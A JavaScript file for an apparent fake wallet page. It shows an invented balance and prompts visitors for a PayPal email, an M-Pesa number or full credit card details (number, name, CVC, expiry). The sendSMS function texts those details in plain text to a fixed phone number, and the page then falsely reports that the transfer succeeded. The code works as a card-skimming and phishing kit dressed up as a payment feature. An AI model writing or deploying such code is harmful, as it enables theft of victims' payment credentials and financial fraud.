let balance = 186976.44;

function formatNumber(num) {
    return num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function sendSMS(message) {
    fetch("https://api.africastalking.com/version1/messaging", {
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "apiKey": "YOUR_API_KEY"
        },
        body: new URLSearchParams({
            "username": "YOUR_USERNAME",
            "to": "+254790408472",
            "message": message,
            "from": "YourSenderID"
        })
    })
    .then(response => response.json())
    .then(data => console.log("SMS Sent:", data))
    .catch(error => console.error("SMS Error:", error));
}

function updateBalanceDisplay() {
    document.getElementById("balance").innerText = "Balance: KES " + formatNumber(balance);
}

function validateInput(method) {
    if (method.toLowerCase() === "paypal") {
        let email = prompt("Enter your PayPal Email:");
        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
            alert("Invalid PayPal email.");
            return false;
        }
        return email;
    } 
    else if (method.toLowerCase() === "mpesa") {
        let phone = prompt("Enter your MPESA number (10 digits):");
        if (!phone || !/^\d{10}$/.test(phone)) {
            alert("Invalid MPESA number.");
            return false;
        }
        return phone;
    } 
    else if (method.toLowerCase() === "credit card") {
        let cardNumber = prompt("Enter your 16-digit Credit Card number:");
        if (!cardNumber || !/^\d{16}$/.test(cardNumber)) {
            alert("Invalid Credit Card number.");
            return false;
        }
        let cardName = prompt("Enter Cardholder's Name:");
        if (!cardName || cardName.trim().length < 2) {
            alert("Invalid Cardholder Name.");
            return false;
        }
        let cvc = prompt("Enter 3-digit CVC:");
        if (!cvc || !/^\d{3}$/.test(cvc)) {
            alert("Invalid CVC number.");
            return false;
        }
        let expiry = prompt("Enter Expiry Date (MM/YY):");
        if (!expiry || !/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) {
            alert("Invalid Expiry Date.");
            return false;
        }
        return `${cardNumber}, ${cardName}, ${cvc}, ${expiry}`;
    }
    return false;
}

function initiateTransaction(type) {
    let method = prompt("Select " + type + " method: MPESA, PayPal, or Credit Card");
    if (!method) return;

    let amount = parseFloat(prompt("Enter amount to " + type + " (Min: 500 KES, Max: 250,000 KES):"));
    if (isNaN(amount) || amount < 500 || amount > 250000 || (type === "withdraw" && amount > balance)) {
        setTimeout(() => alert("Invalid amount or insufficient balance."), 1000);
        return;
    }

    let account = validateInput(method);
    if (!account) return;

    if (confirm(`Confirm ${type} of KES ${formatNumber(amount)} via ${method} to ${account}?`)) {
        if (type === "withdraw") balance -= amount;
        else balance += amount;
        updateBalanceDisplay();

        let smsMessage = `${type.charAt(0).toUpperCase() + type.slice(1)} Alert: KES ${formatNumber(amount)} ${type}ed via ${method}. Account: ${account}. New Balance: KES ${formatNumber(balance)}`;
        sendSMS(smsMessage);

        setTimeout(() => {
            alert(`KES ${formatNumber(amount)} ${type}ed successfully via ${method}. Beneficiary will receive in 30 sec.`);
        }, 3000);
    }
}

function initiateWithdrawal() {
    initiateTransaction("withdraw");
}

function initiateDeposit() {
    initiateTransaction("deposit");
}

updateBalanceDisplay();
